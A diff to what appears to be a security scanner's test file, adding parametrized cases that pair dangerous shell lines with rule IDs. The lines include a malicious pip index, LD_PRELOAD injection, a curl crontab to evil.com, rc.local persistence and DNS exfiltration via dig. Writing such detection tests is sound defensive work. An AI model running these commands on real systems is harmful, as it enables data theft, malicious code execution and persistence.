@@ -517,6 +517,11 @@ class TestSafetyChecks:
             ("dig abcdefghijklmnopqrstuvwxyz.evil.com\n", "SEC-393"),
             ("eval $CMD\n", "SEC-394"),
             ("rm -rf /var/log\n", "SEC-395"),
+            ("export https_proxy=http://user:pass@evil.com\n", "SEC-396"),
+            ("pip install pkg --index-url http://evil.com/simple\n", "SEC-397"),
+            ("export LD_PRELOAD=/tmp/evil.so\n", "SEC-398"),
+            ("crontab curl http://evil.com 4444\n", "SEC-399"),
+            ("echo evil >> /etc/rc.local\n", "SEC-400"),
         ],
     )
     def test_various_dangerous_patterns(self, tmp_path: Path, content: str, rule_id: str) -> None:
